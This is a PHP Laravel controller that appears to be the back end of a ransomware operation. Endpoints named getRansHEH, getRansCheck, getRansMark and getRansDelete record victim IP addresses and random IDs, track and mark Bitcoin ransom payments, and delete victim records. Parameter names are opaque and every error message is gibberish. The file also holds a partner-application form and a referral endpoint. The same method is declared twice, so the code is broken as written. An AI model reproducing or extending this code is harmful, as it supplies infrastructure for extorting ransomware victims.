<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
        $ret = null;
    	return view('index', compact(['ret']));
    }
    
   
    
    
    public function postPartner(Request $request)
	{
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'name' => 'required',
                             'email' => 'required|email',
                             'location' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Fill in your name, email and location (city and state)!";
                       
                 }
                
                 else
                 { 
                 	  $s = "New application request: ".date("h:i A jS F, Y");
                       $rcpt = "expoze.inc@gmail.com";
                       $name = $req["name"];
                       $email = $req["email"];
                       $location = $req["location"];

                       $this->helpers->sendEmail($rcpt,$s,['name' => $name,'email' => $email,'location' => $location],'emails.apply_alert','view');  
                        $ret = "OK";                      
                  }       
           return $ret;                                                                                            
	}

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getRansHEH(Request $request)
    {
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'ip' => 'required',
                             'randd' => 'required',
                             'r' => 'required',
                             'mokije' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "wjhwjwhjef owkjhjknj!";
                       
                 }
                
                 else
                 { 
                       $this->helpers->addRecord($req);  
                       $this->helpers->addPayment($req);  
                        $ret = "OK";                      
                  }       
           return $ret;                                                                                            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getRansCheck(Request $request)
    {
         $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'ip' => 'required',
                             'randd' => 'required',
                             'btc' => 'required',
                             'r' => 'required',
                             'mokije' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "wjhwjwhjef owkjhjknj!";
                       
                 }
                
                 else
                 { 
                       $ret = $this->helpers->getPaymentStatus($req);  
                  }       
           return json_encode($ret);
    }

	
	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getRansDelete(Request $request)
    {
         $req = $request->all();
		   #dd($req);
           $ret = "zip";
               
                $validator = Validator::make($req, [
                             'ip' => 'required',
                             'randd' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "wjhwjwhjef owkjhjknj!";
                       
                 }
                
                 else
                 { 
                       $this->helpers->deleteRecords($req['randd']);  
                       $this->helpers->deletePayment($req['randd']); 
                       $ret = "ok";					   
                  }       
           return $ret;
    }
	
	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getRecords()
    {
        $ret = $this->helpers->getRecords();
    	return json_encode($ret);
    }
	
	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getPayments()
    {
        $ret = $this->helpers->getPayments();
    	return json_encode($ret);
    }
	
	
	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getRansMark(Request $request)
    {
           $req = $request->all();
		   #dd($req);
           $ret = "zip";
               
                $validator = Validator::make($req, [
                             'status' => 'required',
                             'gg' => 'required',
                             'link' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "wjhwjwhjef owkjhjknj!";
                       
                 }
                
                 else
                 { 
                       $this->helpers->markPayment($req);  
                        $ret = "ok";                      
                  }       
           return $ret;                                                                                            
    }
	
	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getRansDelete(Request $request)
    {
           $req = $request->all();
		   #dd($req);
           $ret = "zip";
               
                $validator = Validator::make($req, [
                             'type' => 'required',
                             'gg' => 'required', 
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "wjhwjwhjef owkjhjknj!";
                       
                 }
                
                 else
                 { 
			            $type = $req['type'];
						
						if($type == "p") $this->helpers->deletePayment($req);  
						else if($type == "r") $this->helpers->deleteRecords($req);
						
                        $ret = "ok";                      
                  }       
           return $ret;                                                                                            
    }/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getAddReferral(Request $request)
    {
           $req = $request->all();
		   #dd($req);
           $ret = [];
               
                $validator = Validator::make($req, [
                             'email' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "wjhwjwhjef owkjhjknj!";
                       
                 }
                
                 else
                 { 
                       $this->helpers->addReferral($req);  
                       $ret = json_encode(["status" => "ok"]);                      
                 }       
				 
           return $ret;                                                                                            
    }
	
}
